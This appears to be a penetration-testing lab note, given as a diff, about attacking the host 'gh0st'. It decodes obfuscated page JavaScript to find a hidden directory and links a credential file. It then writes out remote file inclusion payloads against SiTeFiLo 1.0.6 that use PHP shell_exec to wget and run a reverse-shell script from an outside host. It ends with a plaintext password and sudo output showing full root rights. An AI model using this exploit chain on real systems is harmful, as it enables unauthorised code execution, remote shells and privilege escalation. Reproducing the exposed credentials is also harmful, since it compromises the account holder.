@@ -1,0 +1,80 @@
+view-source:http://10.11.1.133/test.asp
+
+<html>
+<head>
+</head>
+<body>
+<center>
+<!--script src=hidd3n-script></script>-->
+</center>
+</body>
+</html>
+
+
+http://10.11.1.133/hidd3n-script
+
+var _0x5490=["\x6C\x65\x6E\x67\x74\x68","\x20","\x6F\x66\x66\x73\x65\x63\x70\x68\x75\x6E\x31\x2E\x67\x69\x66","\x6F\x66\x66\x73\x65\x63\x70\x68\x75\x6E\x32\x2E\x70\x6E\x67","\x67\x65\x74\x53\x65\x63\x6F\x6E\x64\x73","\x66\x6C\x6F\x6F\x72","\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x27","\x27\x3E","\x77\x72\x69\x74\x65","\x6F\x66\x66\x73\x65\x63\x70\x68\x75\x6E\x35\x2E\x62\x6D\x70","\x64\x36\x34\x36\x37\x65\x31\x30\x39\x63\x31\x36\x30\x36\x65\x64\x32\x39","\x2D","\x31\x66\x32\x65\x37\x33\x37\x30\x35\x32\x30\x37\x62\x64","\x32\x31\x32\x31\x33\x2F"];var sillydate=0;var sillyvar=0;function StringArray(_0x5b7ex4) {this[_0x5490[0]]=_0x5b7ex4;for (var _0x5b7ex5=1;_0x5b7ex5 <= _0x5b7ex4;_0x5b7ex5++) {this[_0x5b7ex5]=_0x5490[1];};};image=new StringArray(10);image[0]=_0x5490[2];image[1]=_0x5490[3];image[2]=_0x5490[2];image[3]=_0x5490[3];image[4]=_0x5490[2];image[5]=_0x5490[3];image[6]=_0x5490[2];image[7]=_0x5490[3];image[8]=_0x5490[3];image[9]=_0x5490[3];var ran=60/image[_0x5490[0]];function _0x5491() {sillydate=new Date();sillyvar=sillydate[_0x5490[4]]();sillyvar=Math[_0x5490[5]](sillyvar/ran);return (image[sillyvar]);};function _0x5499(_0x4499) {var hmmmm=document.createElement("img");hmmmm.src="/"+_0x4499;document.body.appendChild(hmmmm);}//_0x5499(_0x5490[12]+_0x5490[10]+_0x5490[11]+_0x5490[13]+_0x5491());
+document[_0x5490[8]](_0x5490[6]+_0x5491()+_0x5490[7]);
+
+decode javascritp:
+
+var _0x5490=["length"," ","offsecphun1.gif","offsecphun2.png","getSeconds","floor",
+"<img src='","'>","write","offsecphun5.bmp","d6467e109c1606ed29","-","1f2e73705207bd","21213/"];
+
+var sillydate=0;
+var sillyvar=0;
+
+function StringArray(_0x5b7ex4) {
+this[_0x5490[0]]=_0x5b7ex4;
+for (var _0x5b7ex5=1;_0x5b7ex5 <= _0x5b7ex4;_0x5b7ex5++) {
+this[_0x5b7ex5]=_0x5490[1];};};
+
+image=new StringArray(10);
+image[0] = 'offsecphun1.gif';
+image[1] = 'offsecphun2.png';
+image[2] = 'offsecphun1.gif';
+image[3] = 'offsecphun2.png';
+image[4] = 'offsecphun1.gif';
+image[5] = 'offsecphun2.png';
+image[6] = 'offsecphun1.gif';
+image[7] = 'offsecphun2.png';
+image[8] = 'offsecphun2.png';
+image[9] = 'offsecphun2.png';
+var ran=60/image[_0x5490[0]];
+
+function _0x5491() {
+sillydate=new Date();
+sillyvar=sillydate[_0x5490[4]]();
+sillyvar=Math[_0x5490[5]](sillyvar/ran);
+return (image[sillyvar]);};
+
+function _0x5499(_0x4499) {
+var hmmmm=document.createElement("img");
+hmmmm.src="/"+_0x4499;document.body.appendChild(hmmmm);}
+//_0x5499(_0x5490[12]+_0x5490[10]+_0x5490[11]+_0x5490[13]+_0x5491()); 
+document[_0x5490[8]](_0x5490[6]+_0x5491()+_0x5490[7]);
+
+
+http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/ - login page
+
+http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slog_users.txt credential
+
+
+Simple Text-File Login script (SiTeFiLo) 1.0.6 - File Disclosure / Remote File Inclusion CVE-2008-5763 CVE-2008-5762 
+
+http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=[shell_reverse_txt]
+
+http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=data:text/plain,<?php echo shell_exec("wget http://IP/reverseshell.sh /tmp/reverse.sh)?>
+
+http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=data:text/plain,<?php echo shell_exec("/bin/bash /tmp/reverseshell.sh")?>
+
+cat slog_users.php
+
+su kibosh
+
+Kibosh:fbX8kAx3Y7ycgnm
+
+sudo -l 
+
+User kibosh may run the following commands on gh0st:
+    (ALL : ALL) ALL
